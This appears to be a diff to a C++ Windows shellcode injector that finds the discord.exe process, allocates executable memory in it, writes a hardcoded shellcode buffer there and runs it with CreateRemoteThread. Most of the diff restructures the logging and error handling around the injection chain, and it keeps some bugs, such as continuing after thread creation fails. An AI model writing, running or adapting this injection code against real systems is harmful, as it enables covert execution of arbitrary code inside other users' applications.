@@ -7,20 +7,8 @@
 #pragma comment( lib, "shlwapi.lib")
 
 
-template <typename ... T>
-__forceinline void print_bad(const char* format, T const& ... args)
-{
-    printf("[!] ");
-    printf(format, args ...);
+#define print(format, ...) fprintf (stderr, format, __VA_ARGS__)
 
-}
-
-template <typename ... T>
-__forceinline void print_good(const char* format, T const& ... args)
-{
-    printf("[+] ");
-    printf(format, args ...);
-}
 
 DWORD GetPID(const char* pn)
 {
@@ -41,7 +29,7 @@ DWORD GetPID(const char* pn)
                 if (!_stricmp(pE.szExeFile, pn))
                 {
                     procId = pE.th32ProcessID;
-                    print_good("Process found : 0x%lX\n", pE.th32ProcessID);
+                    printf("Process found : 0x%lX\n", pE.th32ProcessID);
                     break;
                 }
             } while (Process32Next(hSnap, &pE));
@@ -74,29 +62,34 @@ int main(void)
         "\x54\x53\xff\xd6\x57\xff\xd0";
 
     HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPID("discord.exe"));
-    if (hw)
+    if (!hw)
     {
-        void* base = VirtualAllocEx(hw, NULL, sizeof(ExecBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (base)
-        {
-            if (WriteProcessMemory(hw, base, ExecBuffer, sizeof(ExecBuffer), NULL))
-            {
-                HANDLE thread = CreateRemoteThread(hw, NULL, NULL,(LPTHREAD_START_ROUTINE)base, NULL, 0, 0);
-                if (thread)
-                {
-                    print_good("Thread Created Succesfully 0x%lX\n", thread);
-                    if (WaitForSingleObject(thread, INFINITE) != 0b11111111111111111111111111111111)
-                        print_good("Thread finished Succesfully 0x%lX\n", thread);
-                    else
-                        print_bad("error in WaitForSingleObject 0x%lX\n", GetLastError());
-                }
-                else
-                    print_bad("Failed to create thread (0x%lX)\n", GetLastError());
-            }
-            else
-                print_bad("write process memory faild (0x%lX)\n", GetLastError());
-        }
+        printf("Process Not found (0x%lX)\n", GetLastError());
+        return -1;
     }
+    void* base = VirtualAllocEx(hw, NULL, sizeof(ExecBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!base)
+    {
+        CloseHandle(hw);
+        return -1;
+    }
+    if (!WriteProcessMemory(hw, base, ExecBuffer, sizeof(ExecBuffer), NULL))
+    {
+        printf("write process memory faild (0x%lX)\n", GetLastError());
+        CloseHandle(hw);
+        return -1;
+    }
+    HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)base, NULL, 0, 0);
+    if (!thread)
+    {
+        printf("Failed to create thread (0x%lX)\n", GetLastError());
+        CloseHandle(hw);
+        CloseHandle(thread);
+    }
+    printf("Thread Created Succesfully 0x%lX\n", thread);
+    if (WaitForSingleObject(thread, INFINITE) != 0b11111111111111111111111111111111)
+        printf("Thread finished Succesfully 0x%lX\n", thread);
     else
-        print_bad("Process Not found (0x%lX)\n", GetLastError());
+        printf("error in WaitForSingleObject 0x%lX\n", GetLastError());
+
 }
